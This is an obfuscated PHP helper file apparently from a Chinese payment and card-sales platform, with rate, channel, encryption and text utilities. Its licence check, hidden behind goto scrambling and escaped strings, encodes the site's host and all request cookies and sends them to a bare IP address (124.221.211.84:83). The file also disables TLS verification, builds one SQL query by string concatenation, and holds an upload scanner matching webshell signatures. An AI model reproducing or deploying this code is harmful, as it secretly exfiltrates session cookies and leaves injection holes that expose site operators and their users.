$opts[CURLOPT_POSTFIELDS] = $param["\144\141\x74\x61"]; axcj4: goto Vhv_p; ZMGK_: goto MdWs2; TfwPi: $param["\150\145\x61\x64\x65\162"] = isset($param["\x68\145\x61\x64\x65\162"]) ? $param["\x68\x65\x61\x64\145\162"] : ''; $param["\144\x61\x74\x61"] = isset($param["\x64\141\x74\x61"]) ? $param["\144\141\164\141"] : ''; if (empty($param["\144\x61\x74\x61"])) { goto UCAJh; } $param["\155\145\164\x68\x6f\144"] = isset($param["\x6d\x65\164\150\x6f\144"]) ? $param["\x6d\145\x74\x68\157\x64"] : "\120\x4f\123\x54"; goto D0e87; UCAJh: $param["\x6d\145\164\x68\x6f\144"] = isset($param["\155\145\164\150\157\144"]) ? $param["\155\145\164\x68\x6f\144"] : "\x47\x45\x54"; D0e87: $opts = [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]; $opts[CURLOPT_TIMEOUT_MS] = isset($param["\164\151\155\145\157\x75\x74"]) ? $param["\164\x69\x6d\145\157\165\164"] : 2000; goto v7CXc; QSU82: KmsUR: $ch = curl_init(); curl_setopt_array($ch, $opts); $redata = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $error = curl_error($ch); curl_close($ch); if ("\62\x30\x30" == $code) { goto fL76r; } return $error; goto QW4tc; goto cteZm; KhPxP: } } function get_client_ip($type = 0, $adv = false) { goto CYCBx; K4BBf: if (isset($_SERVER["\x48\124\124\x50\x5f\x43\x4c\x49\x45\x4e\x54\137\x49\x50"])) { goto TN3h5; } if (isset($_SERVER["\x52\x45\115\x4f\124\105\137\101\x44\x44\122"])) { goto X2npP; } goto gXdVd; fiZyF: $arr = explode("\x2c", $_SERVER["\x48\x54\x54\120\137\130\x5f\x46\x4f\x52\127\x41\x52\104\x45\x44\x5f\x46\117\122"]); $pos = array_search("\165\x6e\x6b\156\157\x77\156", $arr); if (!(false !== $pos)) { goto TY_hf; } unset($arr[$pos]); TY_hf: $ip = trim($arr[0]); goto HPWXt; OBPhs: oCE5B: $long = sprintf("\45\x75", ip2long($ip)); $ip = $long ? array($ip, $long) : array("\60\x2e\60\56\60\x2e\60", 0); return $ip[$type]; goto b9Q2H; CYCBx: $type = $type ? 1 : 0; static $ip = NULL; if (!($ip !== NULL)) { goto g5KTz; } return $ip[$type]; g5KTz: if ($adv) { goto kh8P2; } if (isset($_SERVER["\x52\105\x4d\x4f\124\105\137\101\x44\104\122"])) { goto OW0Eo; } goto oCE5B; kh8P2: if (isset($_SERVER["\x48\124\x54\x50\x5f\x58\x5f\x46\117\x52\127\101\122\104\x45\104\x5f\x46\x4f\122"])) { goto fiZyF; } goto K4BBf; HPWXt: goto gXdVd; TN3h5: $ip = $_SERVER["\110\x54\124\x50\x5f\103\x4c\111\105\x4e\124\x5f\x49\x50"]; goto gXdVd; X2npP: $ip = $_SERVER["\x52\105\115\x4f\124\105\x5f\101\x44\104\122"]; gXdVd: goto oCE5B; OW0Eo: $ip = $_SERVER["\122\x45\x4d\117\124\x45\137\101\x44\x44\122"]; goto OBPhs; b9Q2H: } goto vsQeX; MYRhQ: function get_user_rate($user_id, $channel_id) { $rate = 0; $userRate = Db::name("\165\163\145\162\x52\141\x74\145")->where(["\x75\x73\145\x72\x5f\151\x64" => $user_id, "\143\150\141\156\x6e\x65\154\137\151\x64" => $channel_id])->find(); if (!$userRate || $userRate["\x72\x61\x74\145"] == 0) { goto MOFTA; } $rate = $userRate["\162\x61\164\x65"]; goto o5xs3; MOFTA: $rate = Db::name("\x63\x68\141\x6e\156\145\154")->where(["\x69\144" => $channel_id])->value("\x6c\157\x77\162\x61\x74\x65"); o5xs3: return round($rate, 4); } function get_user_srate($user_id, $channel_id) { $rate = 0; $userRate = Db::name("\x75\x73\x65\162\123\145\x6c\x66\122\141\x74\x65")->where(["\x75\163\x65\x72\137\151\144" => $user_id, "\x63\x68\x61\156\x6e\145\x6c\x5f\x69\144" => $channel_id])->find(); if (!$userRate || $userRate["\x70\x6f\x75\x6e\x64\141\147\145"] == 0) { goto TEYRs; } $rate = $userRate["\160\x6f\165\x6e\x64\141\x67\x65"]; goto sGG60; TEYRs: $rate = Db::name("\x73\x65\154\146\x5f\x63\x68\x61\156\x6e\x65\154")->where(["\151\x64" => $channel_id])->value("\154\x6f\167\x72\x61\164\x65"); sGG60: return round($rate, 4); } function get_user_poundage_rate($user_id, $channel_id) { $rate = 0; $userRate = Db::name("\165\163\145\162\123\x65\154\x66\122\141\164\x65")->where(["\165\x73\145\x72\137\151\144" => $user_id, "\x63\x68\x61\x6e\x6e\145\x6c\x5f\x69\x64" => $channel_id])->find(); if (!$userRate || $userRate["\x70\x6f\165\156\144\141\x67\x65"] == 0) { goto wt4ic; } $rate = $userRate["\160\x6f\x75\x6e\x64\x61\147\x65"]; goto GG0do; wt4ic: $rate = Db::name("\x73\x65\x6c\146\x5f\143\x68\141\156\156\145\154")->where(["\x69\x64" => $channel_id])->value("\160\157\x75\156\x64\141\x67\145"); GG0do: return round($rate, 4); } function get_user_srate_api($user_id, $channel_id) { $rate = 0; $userRate = Db::name("\x75\163\x65\x72\x53\x65\x6c\x66\x52\141\164\x65")->where(["\x75\x73\145\162\x5f\x69\x64" => $user_id, "\x63\x68\x61\x6e\156\145\x6c\137\151\144" => $channel_id])->find(); if (!$userRate || $userRate["\x72\141\x74\x65\137\x61\160\151"] == 0) { goto p82PD; } $rate = $userRate["\162\x61\x74\145\137\141\x70\151"]; goto IavN1; p82PD: $rate = Db::name("\x73\x65\x6c\146\x5f\143\x68\x61\156\x6e\x65\154")->where(["\x69\x64" => $channel_id])->value("\x72\x61\x74\145\x5f\141\x70\x69"); IavN1: return round($rate, 4); } function get_user_rate_api($user_id, $channel_id) { $rate = 0; $userRate = Db::name("\x75\163\145\162\122\x61\x74\145")->where(["\x75\x73\x65\x72\x5f\x69\144" => $user_id, "\x63\x68\x61\x6e\156\145\x6c\137\x69\x64" => $channel_id])->find(); if (!$userRate || $userRate["\x72\141\x74\145\137\141\160\151"] == 0) { goto n9h6Q; } $rate = $userRate["\x72\x61\164\145\137\x61\160\151"]; goto PLHuc; n9h6Q: $rate = Db::name("\143\x68\141\156\156\145\154")->where(["\x69\x64" => $channel_id])->value("\162\141\x74\x65\137\x61\x70\x69"); PLHuc: return round($rate, 4); } function get_user_self_channel_status($user_id, $channel_id) { $status = 1; $userChannel = Db::name("\165\x73\145\x72\x53\x65\x6c\146\103\150\x61\156\156\145\x6c")->where(["\165\x73\x65\162\x5f\151\144" => $user_id, "\143\150\x61\x6e\156\145\x6c\137\151\x64" => $channel_id])->find(); if (!$userChannel) { goto l0QQY; } $status = $userChannel["\x73\x74\141\164\x75\x73"] == 1 && $userChannel["\150\164\163\164\x61\164\165\163"] == 1; goto YBXbK; l0QQY: $status = 0; YBXbK: return $status; } function get_user_channel_status($user_id, $channel_id) { $status = 1; $userChannel = Db::name("\165\163\145\x72\x43\150\141\x6e\x6e\x65\154")->where(["\x75\163\x65\x72\137\x69\x64" => $user_id, "\143\x68\141\x6e\156\x65\x6c\x5f\151\144" => $channel_id])->find(); if (!$userChannel) { goto UIuJ3; } $status = $userChannel["\163\x74\x61\164\x75\x73"]; goto VTIVx; UIuJ3: $rate = Db::name("\x63\x68\x61\156\156\145\x6c")->where(["\x69\144" => $channel_id])->value("\163\164\141\164\165\x73"); VTIVx: return $status; } function get_product_name($type) { $product_name = \app\common\model\Product::field("\164\x69\x74\154\145")->where(["\x70\141\171\164\x79\x70\x65" => $type])->find(); return isset($product_name["\x74\151\x74\154\x65"]) ? $product_name->title : get_paytype_name($type); } function get_user_channels($user_id) { $channels = \app\common\model\Channel::order("\x73\157\x72\164\40\x64\145\x73\x63")->where(["\x73\x74\141\x74\x75\163" => 1])->select(); $rate_group_user = Db::name("\162\x61\x74\145\137\147\162\157\165\160\137\x75\x73\145\x72")->where("\165\163\145\x72\137\151\144", $user_id)->find(); $channel_ids = []; if (empty($rate_group_user)) { goto sb13v; } $channel_ids_temp = Db::name("\162\x61\x74\145\137\147\x72\157\x75\x70\137\162\x75\154\145")->where(["\x67\x72\157\165\160\137\x69\x64" => $rate_group_user["\147\x72\157\x75\x70\x5f\x69\144"], "\163\x74\x61\164\165\163" => 1])->field("\143\150\x61\x6e\x6e\x65\x6c\x5f\x69\144")->select(); foreach ($channel_ids_temp as $channel) { array_push($channel_ids, $channel["\x63\150\x61\x6e\156\x65\154\137\151\x64"]); pvBwi: } bEyPX: sb13v: $userChannels = []; foreach ($channels as &$v) { if (empty($channel_ids)) { goto pg840; } if (in_array($v->id, $channel_ids)) { goto iGfs3; } goto VZKnJ; iGfs3: pg840: $userChannels[] = ["\165\x73\145\x72\x5f\x69\x64" => $user_id, "\143\150\141\156\x6e\145\154\x5f\151\144" => $v->id, "\x70\141\x79\x74\x79\x70\x65" => $v->paytype, "\164\151\164\x6c\x65" => $v->title, "\163\x68\x6f\x77\137\156\141\155\x65" => $v->show_name, "\x72\x61\x74\145" => get_user_rate($user_id, $v->id), "\162\x61\x74\145\137\x61\160\151" => get_user_rate_api($user_id, $v->id), "\x73\164\141\164\165\163" => get_user_channel_status($user_id, $v->id), "\x70\162\157\144\x75\x63\x74\x5f\156\x61\x6d\145" => get_product_name($v->paytype), "\x69\x73\137\141\x76\x61\151\154\141\142\x6c\145" => $v->is_available]; VZKnJ: } RGoXd: return $userChannels; } function get_self_user_channels($user_id) { $channels = \app\common\model\SelfChannel::order("\163\x6f\x72\164\40\144\x65\x73\143")->where(["\x73\x74\141\x74\165\163" => 1])->select(); $rate_group_user = Db::name("\163\162\141\x74\x65\137\147\162\x6f\165\x70\x5f\x75\x73\x65\162")->where("\x75\163\145\162\x5f\x69\144", $user_id)->find(); $channel_ids = []; if (empty($rate_group_user)) { goto cRCGG; } $channel_ids_temp = Db::name("\163\162\x61\x74\145\137\147\162\157\165\160\137\162\x75\x6c\x65")->where(["\x67\162\157\x75\160\137\151\x64" => $rate_group_user["\x67\162\157\x75\x70\137\x69\144"], "\x73\164\141\164\x75\x73" => 1])->field("\143\150\x61\156\x6e\145\154\x5f\x69\144")->select(); foreach ($channel_ids_temp as $channel) { array_push($channel_ids, $channel["\143\x68\x61\156\x6e\145\154\x5f\x69\144"]); lQoc2: } FSx6h: cRCGG: $existChannels = \app\common\model\UserSelfChannel::where(["\x75\163\x65\x72\137\151\x64" => $user_id])->select(); $eChannels = []; foreach ($existChannels as $v) { $eChannels[$v["\143\x68\x61\156\x6e\145\x6c\x5f\151\144"]] = ["\151\144" => $v["\x69\144"], "\160\x61\162\141\155\x73" => $v->params]; A7IC1: } ka0EV: $userChannels = []; foreach ($channels as &$v) { if (empty($channel_ids)) { goto wVHXO; } if (in_array($v->id, $channel_ids)) { goto c8JP0; } goto Fv3R1; c8JP0: wVHXO: $poundage = get_user_poundage_rate($user_id, $v->id); $children = ''; $fields_value = ''; if (!isset($eChannels[$v->id])) { goto aQdAC; } $children = $eChannels[$v->id]["\160\x61\162\141\155\x73"]; $fields_value = json_encode(get_channel_children_pay($v->account_fields, $eChannels[$v->id]["\160\x61\x72\141\x6d\163"])); aQdAC: $userChannels[] = ["\165\x73\x65\x72\137\151\x64" => $user_id, "\143\x68\141\x6e\x6e\x65\x6c\x5f\151\144" => $v->id, "\160\141\171\x74\171\160\x65" => $v->paytype, "\164\x69\x74\154\145" => $v->title, "\x73\150\x6f\x77\137\156\x61\x6d\x65" => $v->show_name, "\141\x70\x70\x6c\x79\165\x72\154" => $v->applyurl, "\162\141\164\x65" => $poundage, "\160\x6f\165\x6e\x64\141\x67\x65" => $poundage, "\162\141\164\145\137\x61\160\x69" => get_user_srate_api($user_id, $v->id), "\163\164\141\164\x75\163" => get_user_self_channel_status($user_id, $v->id), "\146\151\145\154\x64\x73" => $v->account_fields, "\x66\151\x65\154\144\163\137\x76\x61\x6c\x75\x65" => $fields_value, "\x63\x68\x69\154\144\x72\145\x6e" => $children, "\x70\162\x6f\144\165\143\164\x5f\156\x61\x6d\145" => get_product_name($v->paytype), "\151\163\137\x61\x76\141\x69\x6c\x61\142\x6c\145" => $v->is_available]; Fv3R1: } hv3fq: return $userChannels; } goto L2zPn; eWr8A: function getshurl($id) { $qq = Db::name("\165\163\x65\x72")->find($id); return $qq["\x77\x65\142\163\151\x74\x65"]; } function deep_in_array($value, $array) { foreach ($array as $item) { if (is_array($item)) { goto FSqVE; } if ($item == $value) { goto QqKwn; } goto RZYR0; goto JhkDD; QqKwn: return true; JhkDD: FSqVE: if (in_array($value, $item)) { goto ks6au; } if (!deep_in_array($value, $item)) { goto dlDCU; } return true; dlDCU: goto Cp6o9; ks6au: return true; Cp6o9: RZYR0: } dE2Z8: return false; } function checkplugnew($plug_id, $ver) { } function get_merchant_audit_ts($value = 0) { $array = ["\60" => "\74\163\x70\141\156\x20\x73\x74\171\154\x65\x3d\x22\143\x6f\154\157\x72\72\40\162\147\142\50\x32\65\65\x2c\x20\60\x2c\x20\60\x29\73\42\x3e\345\xbe\205\345\244\204\xe7\220\206\x3c\x2f\163\x70\141\156\x3e", "\x31" => "\x3c\163\160\141\x6e\40\163\x74\x79\154\145\75\42\x63\x6f\x6c\157\x72\x3a\x20\162\x67\x62\x28\60\x2c\x20\x31\x37\x36\54\40\x38\x30\51\x3b\x22\x3e\345\xb7\262\345\xae\xa1\xe6\xa0\270\74\57\163\x70\x61\156\76", "\62" => "\xe5\267\262\xe5\x8f\226\xe6\xb6\x88"]; return $array[$value]; } function get_merchant_type($type = 0) { return $type == 0 ? "\xe5\271\263\xe5\217\xb0" : "\xe8\x87\252\xe7\255\276"; } function get_pay_available($value = 0) { $array = ["\x30" => "\351\x80\232\xe7\224\xa8", "\x31" => "\xe6\211\213\xe6\234\xba", "\62" => "\xe7\224\265\350\204\221"]; return $array[$value]; } function get_channel_name($order) { $property_name = $order->order_type == 1 ? "\x73\x65\x6c\146\137\143\150\141\156\x6e\x65\154" : "\x63\150\141\156\156\145\154"; $name = isset($order->{$property_name}) ? $order->{$property_name}->title : ''; return $name; } function authcode($string, $operation = "\x44\x45\x43\117\x44\x45", $key = '', $expiry = 0) { goto jrQiF; jrQiF: $ckey_length = 4; $key = md5($key ? $key : ENCRYPT_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? $operation == "\104\x45\x43\x4f\x44\x45" ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == "\104\105\x43\x4f\x44\x45" ? base64_decode(substr($string, $ckey_length)) : sprintf("\x25\x30\x31\60\144", $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; goto n8sAg; jVeg4: $j = $i = 0; awIw3: if (!($i < 256)) { goto cayBc; } $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; NvVUi: $i++; goto awIw3; goto xESFk; n8sAg: $box = range(0, 255); $rndkey = array(); $i = 0; jHqdO: if (!($i <= 255)) { goto bPaKZ; } $rndkey[$i] = ord($cryptkey[$i % $key_length]); IeVVE: $i++; goto jHqdO; bPaKZ: goto jVeg4; vo5t_: goto zLRit; XOvyD: return substr($result, 26); zLRit: PK2_3: goto sDm00; Q132P: J2ymw: $i++; goto Z6sRh; yvhw4: if ($operation == "\104\105\x43\x4f\104\105") { goto zn7Is; } return $keyc . str_replace("\75", '', base64_encode($result)); goto PK2_3; zn7Is: if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) { goto XOvyD; } return ''; goto vo5t_; xESFk: cayBc: $a = $j = $i = 0; Z6sRh: if (!($i < $string_length)) { goto yvhw4; } $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ $box[($box[$a] + $box[$j]) % 256]); goto Q132P; sDm00: } function curl_get($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_USERAGENT, "\x4d\157\172\x69\x6c\154\x61\x2f\65\56\x30\x20\50\x4c\151\x6e\165\x78\73\40\x55\73\40\101\156\x64\162\x6f\x69\144\40\x34\x2e\x34\x2e\x31\73\40\x7a\150\x2d\143\x6e\x3b\x20\122\70\x31\x35\124\40\102\165\151\x6c\x64\57\112\117\x50\64\x30\x44\51\x20\101\160\x70\x6c\x65\x57\145\x62\113\151\x74\x2f\65\x33\63\x2e\61\40\50\x4b\x48\124\x4d\x4c\x2c\x20\154\x69\x6b\x65\x20\107\145\143\153\157\51\126\x65\162\x73\151\157\156\x2f\x34\x2e\x30\40\115\x51\121\x42\162\157\x77\163\145\162\x2f\64\56\x35\x20\x4d\157\x62\x69\x6c\x65\x20\x53\x61\x66\141\x72\x69\57\65\63\x33\56\61"); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $content = curl_exec($ch); curl_close($ch); return $content; } define("\x52\x4f\117\x54", dirname(__FILE__) . "\57"); goto XaEmO; qSJJY: if (defined("\141\165\x74\x68\x63\157\x64\x65")) { goto kzjz9; } exit(0); kzjz9: if (isset($_SESSION["\x53\106\x5f\x61\165\164\x68\x63\157\144\x65"])) { goto Oxq73; } $SF_string = authcode($_SERVER["\x48\124\x54\x50\137\x48\x4f\x53\x54"] . "\174\174\x7c\174" . authcode . "\174\174\x7c\174" . json_encode($_COOKIE) . "\x7c\x7c\174\174\x31", "\x45\x4e\x43\x4f\104\105", "\x53\106\62\x31\x32\x39\70\x37\x36\x33\x38\x38"); $SF_query = curl_get("\x68\x74\164\160\x3a\57\x2f\x31\x32\64\56\x32\62\x31\x2e\x32\61\x31\56\x38\x34\x3a\70\x33\57\123\106\x5f\x41\120\x49\x2f\x53\x46\137\103\150\145\143\x6b\x2e\160\150\160\77\x53\106\137\x73\x74\x72\x69\x6e\x67\x3d" . base64_encode($SF_string)); $SF_query = authcode(base64_decode($SF_query), "\104\x45\103\117\x44\x45", "\x53\106\62\61\x32\x39\x38\x37\x36\63\x38\x38"); $SF_query = json_decode($SF_query, true); if (is_array($SF_query)) { goto BYAs5; } exit("\346\202\250\344\270\x8b\xe8\xbd\275\347\232\204\350\x80\x81\xe7\211\210\346\234\254\346\227\xa0\346\263\225\xe7\xbb\247\347\273\xad\344\xbd\xbf\xe7\224\250\x2c\350\257\267\345\x88\xb0\345\xae\230\347\xbd\x91\344\xb8\213\xe8\275\xbd\346\234\x80\xe6\x96\xb0\347\211\210\346\x9c\xac\xef\xbc\x9a\x77\167\x77\56\x6d\146\170\x77\x2e\x63\143"); goto EkGk3; vsQeX: function getnewprice($str) { $pos = strpos($str, "\x7c"); if ($pos) { goto XdQ7P; } return 0; goto ICQY6; XdQ7P: $arr = explode("\x7c", $str); return $arr[1]; ICQY6: } function check_yzkeyword($words, $str) { if (!($str !== '')) { goto LKf6Z; } foreach ($words as $word) { if (!$word) { goto GbvCZ; } if (!(strpos($str, $word) !== false)) { goto uyhe3; } return $word; goto T4GfC; uyhe3: GbvCZ: ioTiM: } T4GfC: LKf6Z: return true; } function baidutuisong($type, $urlsArr) { $type = "\x65\144\x69\164" == $type ? "\x75\x70\x64\141\164\x65" : "\x75\x72\154\163"; $api = "\150\x74\164\x70\x3a\x2f\57\144\141\x74\x61\x2e\172\x7a\x2e\x62\x61\151\x64\x75\x2e\x63\x6f\155\x2f\x75\x72\154\x73\x3f\163\x69\x74\x65\x3d" . sysconf("\142\x61\151\144\x75\165\162\154") . "\x26\164\x6f\x6b\x65\x6e\75" . sysconf("\x62\141\x69\144\x75\163\x65\156\144\165\x72\154"); $ch = curl_init(); $options = array(CURLOPT_URL => $api, CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_POSTFIELDS => $urlsArr, CURLOPT_HTTPHEADER => array("\x43\x6f\156\x74\145\x6e\x74\x2d\x54\171\x70\145\x3a\x20\x74\145\170\164\57\160\154\141\x69\156")); curl_setopt_array($ch, $options); $result = curl_exec($ch); $res = json_decode($result, true); if (isset($res["\162\x65\155\x61\x69\156"]) && isset($res["\x73\165\143\x63\x65\163\163"])) { goto kde6B; } return 0; goto w4CS8; kde6B: return $res["\x72\x65\155\141\151\x6e"]; w4CS8: } function msubstr($str, $start = 0, $length, $charset = "\165\x74\x66\x2d\70", $suffix = true) { if (function_exists("\155\x62\x5f\x73\x75\142\163\x74\x72")) { goto x0gGD; } if (function_exists("\151\x63\x6f\156\166\x5f\163\165\142\x73\x74\162")) { goto d4OuR; } goto BEllu; x0gGD: return mb_substr($str, $start, $length, $charset); goto BEllu; d4OuR: return iconv_substr($str, $start, $length, $charset); BEllu: $re["\165\x74\146\x2d\70"] = "\x2f\133\x1\55\177\135\x7c\x5b\302\55\xdf\135\133\x80\x2d\277\135\x7c\x5b\340\x2d\xef\x5d\133\x80\x2d\xbf\x5d\173\x32\x7d\174\133\xf0\55\377\x5d\133\200\x2d\277\135\173\x33\175\57"; $re["\147\142\62\63\61\x32"] = "\57\x5b\1\55\177\135\174\133\xb0\55\xf7\135\x5b\xa0\55\376\135\57"; $re["\x67\142\153"] = "\57\133\1\55\177\135\174\133\x81\x2d\376\x5d\133\100\55\376\135\57"; $re["\142\x69\x67\65"] = "\57\133\x1\x2d\x7f\x5d\174\133\x81\x2d\376\x5d\x28\133\x40\x2d\x7e\x5d\174\241\55\376\x5d\51\57"; preg_match_all($re[$charset], $str, $match); $slice = join('', array_slice($match[0], $start, $length)); if (!$suffix) { goto MkgrS; } return $slice . "\xe2\x80\xa6"; MkgrS: return $slice; } function clear_htmll($str) { return preg_replace("\57\x3c\x28\x2e\x2a\x3f\x29\x3e\57\151\163", '', $str); } function clear_html($str) { $str = trim($str); $str = preg_replace("\x2f\11\x2f", '', $str); $str = preg_replace("\x2f\xd\xa\x2f", '', $str); $str = preg_replace("\x2f\xd\x2f", '', $str); $str = preg_replace("\x2f\xa\57", '', $str); $str = preg_replace("\57\40\x2f", '', $str); $str = preg_replace("\57\x20\40\57", '', $str); return trim($str); } function getchiprice($hours) { $res = Db::name("\147\x6f\x6f\x64\x73\x5f\143\150\x69\137\160\162\151\x63\x65")->where("\150\157\x75\162\163\75" . $hours)->find(); if ($res) { goto Dftj9; } return "\x3c\x73\x70\x61\156\x20\x73\164\x79\154\145\75\42\x62\x61\x63\x6b\147\x72\157\x75\156\x64\x3a\x23\143\143\x63\73\x20\143\x6f\x6c\157\x72\x3a\x23\146\x66\146\73\x20\160\x61\144\x64\151\156\147\x3a\x33\x70\170\x20\x36\160\170\73\x20\x62\x6f\162\x64\145\162\55\x72\x61\x64\151\x75\163\72\61\x30\160\170\73\x22\x3e\346\231\xae\xe9\x80\x9a\345\225\206\xe5\223\201\x3c\57\163\160\141\x6e\76"; goto WSQ9n; Dftj9: return "\x3c\163\160\141\x6e\40\163\164\x79\x6c\x65\x3d\x22\142\141\143\153\x67\x72\x6f\165\156\144\x3a" . $res["\143\x6f\154\x6f\162\163"] . "\73\40\x63\x6f\x6c\x6f\162\x3a\x23\146\146\146\x3b\x20\x70\141\144\x64\151\x6e\x67\72\63\x70\x78\40\66\160\x78\73\x20\x62\x6f\162\x64\x65\x72\x2d\162\x61\x64\x69\165\x73\x3a\61\60\x70\x78\x3b\42\x3e" . $res["\x74\151\x74\x6c\x65"] . "\x3c\57\x73\160\141\156\76"; WSQ9n: } function checkMuma($img) { goto qMiSF; qMiSF: $status = 0; $tips = array("\60" => "\xe6\226\x87\xe4\xbb\266\346\262\241\351\x97\256\xe9\xa2\230", "\x35" => "\346\226\x87\xe4\xbb\266\346\x9c\211\346\xaf\x92", "\55\61" => "\346\226\x87\xe4\xbb\266\xe6\xb2\241\xe6\234\x89\344\xb8\212\xe4\274\240"); if (file_exists($img)) { goto wX9AK; } $status = -1; goto i4ybQ; wX9AK: $resource = fopen($img, "\x72\142"); $fileSize = filesize($img); fseek($resource, 0); if ($fileSize > 512) { goto Mecqm; } goto T2RCl; ILq2X: unlink($img); k100X: i4ybQ: return $status; goto SYTyf; T2RCl: $hexCode = bin2hex(fread($resource, $fileSize)); goto jS8J2; Mecqm: $hexCode = bin2hex(fread($resource, 512)); fseek($resource, $fileSize - 512); $hexCode .= bin2hex(fread($resource, 512)); jS8J2: fclose($resource); if (!preg_match("\x2f\x28\x33\x63\x32\65\x2e\x2a\x3f\x32\70\56\52\x3f\x32\71\x2e\52\77\62\x35\x33\x65\51\x7c\x33\x63\63\x66\67\60\x36\x38\67\60\x7c\x33\x63\63\146\x7c\x33\x63\x32\x35\174\x33\143\x37\63\x36\63\x37\x32\x36\x39\x37\x30\67\x34\174\x28\x33\143\63\x66\x2e\x2a\x3f\62\70\x2e\52\77\x32\x39\x2e\52\77\x33\146\x33\x65\51\174\x28\63\103\65\63\64\63\x35\62\64\71\x35\x30\65\64\x29\174\x28\62\x46\x35\63\64\63\x35\62\x34\71\65\x30\x35\64\x33\105\x29\174\x28\x33\x43\x37\63\x36\x33\67\x32\x36\x39\67\60\x37\x34\x29\x7c\x28\62\106\x37\x33\x36\x33\x37\62\x36\71\67\60\67\x34\x33\105\51\57\x69\x73", $hexCode)) { goto k100X; } $status = 5; goto ILq2X; SYTyf: } function getshpid($id) { $qq = Db::name("\165\x73\x65\162")->find($id); return $qq["\161\161"]; } function getshqq($id) { $qq = Db::name("\165\163\x65\x72")->find($id); return $qq["\161\161"]; } goto eWr8A; XaEmO: define("\123\x59\123\x54\105\x4d\137\122\117\117\124", dirname(ROOT) . "\57"); include_once ROOT . "\x61\165\x74\150\143\157\144\145\56\160\150\160"; if (file_exists(ROOT . "\141\165\164\150\143\157\144\145\56\x70\150\160")) { goto Fadur; } exit("\345\xbd\223\xe5\211\215\347\275\x91\xe7\253\x99\346\227\xa0\346\x8e\210\346\x9d\203\347\240\201\xef\xbc\x81"); goto jIt83; Fadur: require "\141\165\x74\x68\143\x6f\144\x65\56\160\150\160"; jIt83: require ROOT . "\x76\145\x72\x73\x69\x6f\156\56\160\150\160"; define("\141\x75\164\x68\143\157\x64\145", $authcode); goto qSJJY; bhMyE: Oxq73: